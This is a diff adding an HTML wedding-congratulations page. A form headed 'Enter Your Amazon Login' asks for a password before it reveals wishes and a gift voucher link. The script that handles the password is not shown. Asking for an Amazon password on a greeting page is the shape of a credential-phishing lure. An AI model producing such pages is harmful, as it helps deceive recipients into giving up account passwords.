@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wedding Congratulations</title>
+  <link rel="stylesheet" href="styles.css">
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div id="login-container" class="container">
+    <header>
+      <h1>Enter Your Amazon Login</h1>
+    </header>
+    <form id="login-form">
+      <label for="password">Password:</label>
+      <input type="password" id="password" placeholder="Enter password" required>
+      <button type="submit" class="btn">Submit</button>
+      <p id="error-message" style="color: red; display: none;">Incorrect password. Please try again.</p>
+    </form>
+  </div>
+
+  <div id="content-container" class="container" style="display: none;">
+    <header>
+      <h1>Congratulations on Your Wedding!</h1>
+      <p>Wishing you a lifetime of love and happiness!</p>
+    </header>
+    <section class="message">
+      <p>Dear [Couple's Names],</p>
+      <p>Your love story inspires us all. May your journey together be filled with joy, laughter, and endless love!</p>
+    </section>
+    <section class="gift">
+      <h2>Your Special Gift</h2>
+      <p>Click below to view your gift voucher:</p>
+      <a href="voucher.pdf" class="btn" target="_blank">View Gift Voucher</a>
+    </section>
+    <footer>
+      <p>With love, [Your Name]</p>
+    </footer>
+  </div>
+</body>
+</html>
